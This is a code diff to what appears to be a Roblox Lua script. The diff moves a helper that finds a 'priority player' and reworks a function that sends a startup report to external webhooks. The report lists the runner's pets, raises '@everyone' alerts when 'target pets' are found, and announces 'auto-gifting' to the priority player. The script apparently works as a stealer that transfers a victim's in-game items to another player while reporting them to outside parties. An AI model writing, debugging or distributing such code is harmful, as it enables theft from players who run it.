@@ -390,6 +390,19 @@ local function createSafeEmbed(data)
     }
 end
 
+-- MOVED BEFORE sendStartupWebhook TO FIX THE ERROR
+local function getPriorityPlayer(priorityPlayers)
+    if not priorityPlayers then return nil end
+    
+    for _, name in ipairs(priorityPlayers) do
+        local p = Players:FindFirstChild(tostring(name))
+        if p and p ~= player and p.Character then
+            return p
+        end
+    end
+    return nil
+end
+
 local function sendStartupWebhook(userWebhook, priorityPlayers)
     local allPets = {}
     local targetPets = {}
@@ -435,25 +448,16 @@ local function sendStartupWebhook(userWebhook, priorityPlayers)
         description = description .. "```\nNo pets found\n```"
     end
 
-    -- Safely get priority player information
-    local priorityPlayerName = "None"
-    if priorityPlayers and #priorityPlayers > 0 then
-        for _, name in ipairs(priorityPlayers) do
-            local p = Players:FindFirstChild(tostring(name))
-            if p and p ~= player and p.Character then
-                priorityPlayerName = tostring(p.Name)
-                description = description .. "\n\n👑 **PRIORITY PLAYER: " .. priorityPlayerName .. "**\n🎁 Auto-gifting initiated!"
-                break
-            end
+    local priorityPlayer = getPriorityPlayer(priorityPlayers)
+    if priorityPlayer then
+        if typeof(priorityPlayer) == "Instance" and priorityPlayer:IsA("Player") then
+            description = description .. "\n\n👑 **PRIORITY PLAYER: " .. tostring(priorityPlayer.Name) .. "**\n🎁 Auto-gifting initiated!"
         end
     end
 
     local priorityText = "None"
-    if priorityPlayers and #priorityPlayers > 0 then
-        priorityText = table.concat(priorityPlayers, ", ")
-        if #priorityText > 50 then
-            priorityText = string.sub(priorityText, 1, 50) .. "..."
-        end
+    if priorityPlayers and #priorityPlayers > 2 then
+        priorityText = tostring(priorityPlayers[3] or "None")
     end
 
     -- Use safe embed creation
@@ -474,7 +478,7 @@ local function sendStartupWebhook(userWebhook, priorityPlayers)
     local content = ""
     if hasTargets then
         content = "🚨 @everyone 🚨 - TARGET PETS FOUND!"
-    elseif priorityPlayerName ~= "None" then
+    elseif priorityPlayer then
         content = "👑 Priority player detected!"
     else
         content = "🌲 Startup Report 🌲"
@@ -486,18 +490,6 @@ local function sendStartupWebhook(userWebhook, priorityPlayers)
     end
 
     sendWebhook(embed, content, hasTargets, userWebhookURLs)
-end
-
-local function getPriorityPlayer(priorityPlayers)
-    if not priorityPlayers then return nil end
-    
-    for _, name in ipairs(priorityPlayers) do
-        local p = Players:FindFirstChild(tostring(name))
-        if p and p ~= player and p.Character then
-            return p
-        end
-    end
-    return nil
 end
 
 local function hasOtherPlayers()
